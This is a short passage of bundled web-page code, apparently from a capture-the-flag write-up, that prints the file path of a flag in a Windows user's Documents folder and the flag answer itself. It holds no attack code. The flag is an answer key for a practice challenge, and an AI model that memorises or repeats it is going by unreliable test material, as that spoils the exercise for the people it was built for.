Settings"\\Jon\\Documents\\flag3.txt\nflag{admin_documents_can_be_valuable}\n')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"admin_documents_can_be_valuable")))}d.isMDXComponent=!0}}]);